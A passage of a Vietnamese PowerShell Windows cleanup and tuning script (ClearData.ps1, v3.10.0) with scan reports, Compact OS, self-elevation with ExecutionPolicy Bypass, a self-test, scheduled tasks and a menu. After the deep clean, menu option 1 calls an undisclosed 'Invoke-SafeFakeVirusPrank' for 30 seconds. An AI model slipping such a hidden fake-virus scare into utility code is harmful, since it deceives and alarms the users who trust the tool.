    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh khoi phuc.' -ForegroundColor Red }
}

function Enable-CompactOS {
    Write-Host ''
    Write-Host '    NEN HE DIEU HANH WINDOWS (COMPACT OS)' -ForegroundColor Cyan
    Write-Host '    Su dung tinh nang nen an cua Windows de tiet kiem 2-4GB o dia C:.' -ForegroundColor DarkGray
    Write-Host '    Hoan toan an toan, khong loi file. Qua trinh co the mat 5-15 phut.' -ForegroundColor Yellow
    if (-not (Confirm-YN 'Ban co muon bat dau nien he dieu hanh khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    [LOI] Vui long chay duoi quyen Administrator.' -ForegroundColor Red; return }
    try {
        Write-Host '    Dang kiem tra trang thai Compact OS...' -ForegroundColor Yellow
        $status = compact.exe /compactos:query | Out-String
        if ($status -match 'is in the Compact state') {
            Write-Host '    [THONG BAO] He dieu hanh da duoc nen tu truoc.' -ForegroundColor Green
        } else {
            Write-Host '    Dang tien hanh nen he dieu hanh. VUI LONG DOI VA KHONG TAT MAY...' -ForegroundColor Cyan
            compact.exe /compactos:always | Out-Null
            Write-Host '    [OK] Da nen he dieu hanh thanh cong. Kiem tra dung luong o C: cua ban nhe!' -ForegroundColor Green
        }
    } catch { Write-Host '    [LOI] Phat sinh loi khi thuc thi Compact OS.' -ForegroundColor Red }
}

function Export-ScanCsv {
    param([array]$Results)
    Ensure-LogDir
    $csv = Join-Path $Script:LogDir ('scan_report_' + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.csv')
    $Results | Sort-Object Size -Descending | Select-Object Id,Mode,Name,@{n='Dung luong';e={Format-FileSize $_.Size}},Size,FileCount,Skipped,Note | Export-Csv -Path $csv -Encoding UTF8 -NoTypeInformation
    Write-Host "    Bao cao quet dang CSV: $csv" -ForegroundColor Green
    Write-Log "Bao cao CSV: $csv"
    return $csv
}

function Export-ScanReport {
    param([array]$Results)
    Ensure-LogDir
    $report = Join-Path $Script:LogDir ('scan_report_' + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.txt')
    $lines = @()
    $lines += "Bao cao quet rac he thong Clear Data Windows - $(Get-Date)"
    $lines += "Che do quet: chi quet thong ke dung luong, khong thuc hien xoa tep tin"
    $lines += ""
    foreach ($r in ($Results | Sort-Object Size -Descending)) {
        $lines += ('{0,12}  {1,8} tep tin  [{2}] {3}' -f (Format-FileSize $r.Size), $r.FileCount, $r.Mode, $r.Name)
    }
    $lines | Set-Content -Path $report -Encoding UTF8
    Write-Host "    Bao cao quet: $report" -ForegroundColor Green
    Write-Log "Bao cao quet: $report"
    return $report
}

function Invoke-AutoScan {
    Write-Host '    QUET TU DONG: chi quet thong ke dung luong, khong thuc hien xoa.' -ForegroundColor Cyan
    $r = Invoke-Scan
    Show-ScanResults $r | Out-Null
    Export-ScanReport $r | Out-Null
    if ($ExportCsv) { Export-ScanCsv $r | Out-Null }
}

function Invoke-SmartAutoClean {
    Write-Host '    DON DEP TU DONG THONG MINH: Chi don cac muc An toan & Khuyen nghi co dung luong > 0.' -ForegroundColor Yellow
    Show-RunningAppWarnings
    $ids = Get-IdsByMode @('Safe','Recommended')
    $r = Invoke-Scan $ids
    Show-ScanResults $r | Out-Null
    Export-ScanReport $r | Out-Null
    if ($ExportCsv) { Export-ScanCsv $r | Out-Null }
    $clean = @($r | Where-Object { -not $_.Skipped -and $_.Size -gt 0 } | Sort-Object Size -Descending | ForEach-Object { $_.Id })
    if (-not $clean.Count) { Write-Host '    Khong tim thay rac thich hop de don dep.' -ForegroundColor Green; return }
    if (-not $Yes) {
        if (-not (Confirm-YN 'Ban co muon don dep cac muc tren khong?')) { Write-Host '    Da huy thao tac.' -ForegroundColor DarkGray; return }
    }
    Invoke-Clean $clean
}

function Start-ElevatedSelf {
    param([string[]]$ExtraArgs = @())
    if (Test-AdminRights) { return $true }
    $scriptPath = Join-Path $PSScriptRoot 'ClearData.ps1'
    $argsList = @('-NoProfile','-ExecutionPolicy','Bypass','-NoExit','-File',$scriptPath) + $ExtraArgs
    try {
        Start-Process -FilePath 'powershell.exe' -ArgumentList $argsList -Verb RunAs | Out-Null
        Write-Host ''
        Write-Host '    [XAC NHAN] Da yeu cau quyen Admin. Cua so moi dang mo...' -ForegroundColor Green
        Write-Host '    Vui long bam "Yes" tren hop thoai bao mat UAC (neu co).' -ForegroundColor Yellow
        Write-Host '    Chuong trinh cu se tu dong dong sau 3 giay...' -ForegroundColor DarkGray
        Start-Sleep -Seconds 3
    } catch {
        Write-Host ''
        Write-Host "    [LOI] Khong the nang quyen Admin: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "    Meo: Ban co the click chuot phai vao Run_ClearData.bat va chon 'Run as administrator'" -ForegroundColor Yellow
        Start-Sleep -Seconds 5
    }
    return $false
}

function Get-CurrentCliArgs {
    $cliArgs = @('-Mode', $Mode)
    if ($ScanOnly) { $cliArgs += '-ScanOnly' }
    if ($AllUsers) { $cliArgs += '-AllUsers' }
    if ($Yes) { $cliArgs += '-Yes' }
    if ($LargeFiles) { $cliArgs += @('-LargeFiles','-LargeFileMB',([string]$LargeFileMB)) }
    if ($AutoScan) { $cliArgs += '-AutoScan' }
    if ($AutoClean) { $cliArgs += '-AutoClean' }
    if ($InstallAutoScan) { $cliArgs += '-InstallAutoScan' }
    if ($InstallAutoClean) { $cliArgs += '-InstallAutoClean' }
    if ($UninstallSchedules) { $cliArgs += '-UninstallSchedules' }
    if ($HealthCheck) { $cliArgs += '-HealthCheck' }
    if ($ExportCsv) { $cliArgs += '-ExportCsv' }
    $cliArgs
}

function Find-LargeFiles {
    param([int]$MinMB=1024)
    Ensure-LogDir
    $report = Join-Path $Script:LogDir ('large_file_'+(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')+'.txt')
    $min = [int64]$MinMB * 1MB
    $roots = @(Get-UserRoots)
    Write-Host "    Dang quet tim kiem cac tep lon >= $MinMB MB (chi liet ke, KHONG xoa)..." -ForegroundColor Cyan
    $files = @()
    foreach($root in $roots){
        $found = Get-ChildItem $root -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object{$_.Length -ge $min}
        if ($found) { $files += $found }
    }
    $files | Sort-Object Length -Descending | Select-Object -First 200 | ForEach-Object {
        '{0,12}  {1}' -f (Format-FileSize $_.Length), $_.FullName
    } | Set-Content $report -Encoding UTF8
    Write-Host "    Hoan tat. Danh sach tep lon duoc luu tai bao cao: $report" -ForegroundColor Green
}

function Pause-Back {
    Write-Host ''
    Write-Host '    Nhan phim ENTER de quay lai menu chinh...' -NoNewline -ForegroundColor DarkGray
    Read-Host | Out-Null
}

function Invoke-SelfTest {
    $ErrorActionPreference = 'Stop'
    $Root = $PSScriptRoot
    $ScriptPath = Join-Path $Root 'ClearData.ps1'
    $ReadmePath = Join-Path $Root 'README.md'
    $BatPath = Join-Path $Root 'Run_ClearData.bat'

    function Assert-True {
        param([bool]$Condition, [string]$Message)
        if (-not $Condition) { throw $Message }
        Write-Host "[OK] $Message" -ForegroundColor Green
    }

    Write-Host "--- CHAY BO TU KIEM TRA HE THONG (SELF-TEST) ---" -ForegroundColor Cyan

    $tokens = $null
    $errors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($ScriptPath, [ref]$tokens, [ref]$errors) | Out-Null
    Assert-True (-not $errors) 'Cu phap PowerShell khong co loi'

    $script = Get-Content $ScriptPath -Raw -Encoding UTF8
    $readme = Get-Content $ReadmePath -Raw -Encoding UTF8
    $bat = Get-Content $BatPath -Raw -Encoding UTF8

    Assert-True ($script -match '\$Script:Version = ''3\.10\.0''') 'Phien ban la 3.10.0'
    Assert-True ($script -match 'Tao lich quet tu dong hang ngay') 'Menu ho tro tao lich quet tu dong hang ngay'
    Assert-True ($script -match 'Register-DailyAutoScanTask') 'Ham lap lich quet hang ngay ton tai'
    Assert-True ($script -match 'InstallAutoScan' -and $script -match 'InstallAutoClean' -and $script -match 'UninstallSchedules') 'Tham so lich trinh CLI ton tai'
    Assert-True ($script -match 'ClearDataWindowsWeeklyClean' -and $script -match '-AutoClean -Yes -ExportCsv') 'Lich don dep hang tuan tu dong xuat CSV'
    Assert-True ($script -match '-AutoScan -ExportCsv') 'Lich quet ngay tu dong xuat CSV'
    Assert-True ($script -match 'Go bo lich trinh don dep') 'Menu ho tro go bo lich trinh'
    Assert-True ($script -match 'RunAsAdmin' -and $script -match 'Start-ElevatedSelf' -and $script -match 'Verb RunAs') 'Co che tu nang quyen Admin ton tai'
    Assert-True ($script -match 'Get-CurrentCliArgs' -and $script -match 'Join-ProcessArguments') 'Luu giu co tham so khi nang quyen Admin'
    Assert-True ($script -match 'ChromiumStorage') 'Quy tac don dep bo dem luu tru Chromium ton tai'
    Assert-True ($script -match 'Windows Defender Scan History' -or $script -match 'Lich su quet Windows Defender') 'Quy tac don dep Windows Defender ton tai'
    Assert-True ($script -match 'InstallerPatchOrphans' -or $script -match 'Tep tam Windows Installer') 'Quy tac don dep tep mo coi Installer ton tai'
    Assert-True ($script -match "chi xoa tep mo coi \.tmp/\.log/\.old" -or $script -match "chi tep \.tmp/\.log/\.old") 'Quy tac Installer co mo ta bao ve tep MSI/MSP'
    Assert-True ($script -match 'Test-PathAllowedForCleanup') 'Ham kiem tra danh sach trang hoat dong'
    Assert-True ($script -match 'Test-PathAllowedForCleanup') 'Xac thuc dinh dang duong dan ngoai hoat dong'
    
    # Test Split-ConcatenatedWindowsPaths
    $concatSample = 'C:\foo\barC:\baz\temp'
    $splitSample = Split-ConcatenatedWindowsPaths $concatSample
    Assert-True ($splitSample.Count -eq 2 -and $splitSample[0] -eq 'C:\foo\bar' -and $splitSample[1] -eq 'C:\baz\temp') 'Ham xu ly cong don duong dan hoat dong tot'
    
    $concatRulePaths = @()
    foreach($t in $Script:CleanupTargets){
        foreach($p in (Expand-PathListFlat $t.Paths)){
            if($p -match '[A-Za-z]:\\.+[A-Za-z]:\\') { $concatRulePaths += "$($t.Name): $p" }
        }
    }
    Assert-True ($concatRulePaths.Count -eq 0) 'Khong co duong dan quy tac nao bi loi cong don'

    Assert-True ($script -match 'Fit-Text') 'Bang quet tu dong rut gon ten dai'
    Assert-True ($script -match 'ImportOnly') 'Tham so ImportOnly hoat dong chinh xac'
    Assert-True ($script -match 'Desktop.*Documents.*Downloads') 'Cac thu muc ca nhan duoc bao ve tuyet doi'
    Assert-True ($readme -match '3\.10\.0') 'Tai lieu README ghi nhan lich su phien ban 3.10.0'
    Assert-True ($readme -match 'InstallAutoScan' -and $readme -match 'UninstallSchedules') 'Tai lieu README ghi nhan tham so lich trinh CLI'
    Assert-True ($readme -match 'RunAsAdmin') 'Tai lieu README ghi nhan co che tu nang quyen Admin'
    Assert-True ($bat -match 'Run_ClearData.bat' -or $bat -match 'powershell') 'File chay Run_ClearData.bat hop le'

    $health = & powershell -NoProfile -ExecutionPolicy Bypass -File $ScriptPath -HealthCheck 2>&1 | Out-String
    Assert-True ($LASTEXITCODE -eq 0 -or $null -eq $LASTEXITCODE) 'Lenh HealthCheck thoat thanh cong'
    Assert-True ($health -match 'Khong co ID quy tac trung lap') 'HealthCheck xac nhan khong trung lap ID'
    Assert-True ($health -match 'Quy tac hop le') 'HealthCheck xac nhan cac truong du lieu day du'
    Assert-True ($health -match 'safety-blocked: 0') 'HealthCheck xac nhan khong co duong dan dich bi chan an toan'
    Assert-True ($health -match 'So dinh dang duong dan khong an toan: 0') 'HealthCheck xac nhan dinh dang duong dan an toan'


    Write-Host '[OK] Verification complete: no cleanup performed.' -ForegroundColor Cyan
}

function Test-CleanupConfiguration {
    Write-Host ''
    Write-Host '    KIEM TRA CAU HINH & AN TOAN HE THONG' -ForegroundColor Cyan
    $ids = @($Script:CleanupTargets | ForEach-Object { $_.Id })
    $dup = $ids | Group-Object | Where-Object { $_.Count -gt 1 }
    if ($dup) { Write-Host "    [LOI] Trung lap ID quy tac don dep: $($dup.Name -join ', ')" -ForegroundColor Red } else { Write-Host '    [OK] Khong co ID quy tac trung lap' -ForegroundColor Green }
    
    $bad = @($Script:CleanupTargets | Where-Object { -not $_.Name -or -not $_.Mode -or -not $_.Type })
    if ($bad.Count) { Write-Host "    [LOI] Quy tac bi thieu thong tin bat buoc: $($bad.Count)" -ForegroundColor Red } else { Write-Host '    [OK] Quy tac hop le' -ForegroundColor Green }
    
    $existing = 0
    $blocked = 0
    foreach ($t in $Script:CleanupTargets) {
        foreach ($p in (Get-TargetPaths $t)) {
            if (Test-Path $p -ErrorAction SilentlyContinue) {
                $existing++
                if (-not (Test-PathAllowedForCleanup $p)) { 
                    $blocked++
                    Write-Host "    [CHAN NGUY HIEM] $($t.Name): $p" -ForegroundColor Yellow 
                }
            }
        }
    }
    Write-Host ("    So duong dan ton tai tren o dia: {0}; safety-blocked: {1}" -f $existing,$blocked) -ForegroundColor DarkGray
    
    $unsafePattern = 0
    foreach($t in $Script:CleanupTargets){
        if($t.Type -eq 'MultiPath'){
            foreach($p in (Expand-PathListFlat $t.Paths)){
                if(-not (Test-PathAllowedForCleanup $p)){
                    $unsafePattern++
                    Write-Host "    [CHAN DINH DANG DUONG DAN] $($t.Name): $p" -ForegroundColor Yellow
                }
            }
        } elseif ($t.Type -eq 'FolderContents') {
            if ($t.Path -and -not (Test-PathAllowedForCleanup $t.Path)) {
                $unsafePattern++
                Write-Host "    [CHAN DINH DANG DUONG DAN] $($t.Name): $($t.Path)" -ForegroundColor Yellow
            }
        }
    }
    Write-Host ("    So dinh dang duong dan khong an toan: {0}" -f $unsafePattern) -ForegroundColor DarkGray
    Write-Host '    Hoan thanh kiem tra an toan, khong co tep tin nao bi xoa.' -ForegroundColor Green
}

function Start-MainLoop {
    Ensure-LogDir; Add-ExternalRules
    while($true){
        Show-Banner
        Show-Menu
        Write-Host '    Nhap lua chon cua ban: ' -NoNewline -ForegroundColor Yellow
        $c = (Read-Host).Trim()
        switch($c){
            '1'{
                if(-not(Test-AdminRights)){
                    Write-Host '    Yeu cau nang quyen de don dep manh nhat. Dang xin quyen Admin...' -ForegroundColor Yellow
                    Start-ElevatedSelf @('-Mode','Deep') | Out-Null
                } else {
                    Confirm-And-Clean (Get-IdsByMode @('Safe','Recommended','Deep')) 'DON DEP SAU TOAN HE THONG'
                    Invoke-SafeFakeVirusPrank -Seconds 30
                }
                Pause-Back
            }
            '2'{Optimize-NetworkGaming; Pause-Back}
            '3'{Repair-SystemFiles; Pause-Back}
            '4'{Reset-NetworkDeep; Pause-Back}
            '5'{Optimize-GamingPerformance; Pause-Back}
            '6'{Enable-UltimatePerformance; Pause-Back}
            '7'{Disable-WindowsTelemetry; Pause-Back}
            '8'{Remove-WindowsBloatware; Pause-Back}
            '9'{Optimize-StartMenuAndCortana; Pause-Back}
            '10'{Optimize-DiskDrives; Pause-Back}
            '11'{Optimize-UserExperience; Pause-Back}
            '12'{Optimize-PrivacyAndBackground; Pause-Back}
            '13'{Optimize-PowerAndStorage; Pause-Back}
            '14'{Optimize-WSL; Pause-Back}
            '15'{Restart-WindowsExplorer; Pause-Back}
            '16'{Reset-WindowsUpdateDeep; Pause-Back}
            '17'{Enable-CompactOS; Pause-Back}
            '18'{New-SafeRestorePoint; Pause-Back}
            '19'{Register-WeeklyCleanupTask; Pause-Back}
            '20'{Register-DailyAutoScanTask; Pause-Back}
            '21'{Show-ClearDataSchedules; Pause-Back}
            '22'{Unregister-ClearDataSchedules; Pause-Back}
            '0'{return}
            default{Write-Host '    Lua chon khong hop le.' -ForegroundColor Red; Start-Sleep 1}
        }
    }
}

function Add-ExternalRules {
    if (-not (Test-Path $Script:RulesFile)) { return }
    try {
        $rules = Get-Content $Script:RulesFile -Raw -Encoding UTF8 | ConvertFrom-Json
        $nextId = (($Script:CleanupTargets | Measure-Object Id -Maximum).Maximum + 1)
        foreach ($r in @($rules)) {
            $paths = @($r.Paths | ForEach-Object { Expand-CleanPath $_ })
            $Script:CleanupTargets += @{ Id=$nextId; Mode=([string]$r.Mode); Name=([string]$r.Name); Type='MultiPath'; Paths=$paths; MinAgeHours=([int]$r.MinAgeHours); RequireAdmin=([bool]$r.RequireAdmin); Description=([string]$r.Description) }
            $nextId++
        }
        Write-Log "Loaded external rules: $(@($rules).Count)"
    } catch { Write-Log "External rules error: $($_.Exception.Message)" }
}

# CHAY CHUONG TRINH CHINH
Ensure-LogDir
Add-ExternalRules
if($ImportOnly){ return }
if($SelfTest){ Invoke-SelfTest; return }
if(-not (Test-AdminRights)){ if(-not (Start-ElevatedSelf (Get-CurrentCliArgs))){ return }; return }
if($HealthCheck){ Test-CleanupConfiguration; return }
if($LargeFiles){ Find-LargeFiles $LargeFileMB; return }
if($InstallAutoScan){ Register-DailyAutoScanTask; return }
if($InstallAutoClean){ Register-WeeklyCleanupTask; return }
if($UninstallSchedules){ Unregister-ClearDataSchedules; return }
if($AutoScan){ Invoke-AutoScan; return }
if($AutoClean){ Invoke-SmartAutoClean; return }
if($Mode -ne 'Menu'){
    $ids = switch($Mode){ 'Safe' { Get-IdsByMode @('Safe') } 'Recommended' { Get-IdsByMode @('Safe','Recommended') } 'Deep' { Get-IdsByMode @('Safe','Recommended','Deep') } 'Scan' { @() } }
    if($Mode -eq 'Scan' -or $ScanOnly){ $r=Invoke-Scan; Show-ScanResults $r|Out-Null; if($ExportCsv){Export-ScanCsv $r|Out-Null}; return }
    Confirm-And-Clean $ids "DON DEP CHE DO $Mode"
    return
}
Start-MainLoop
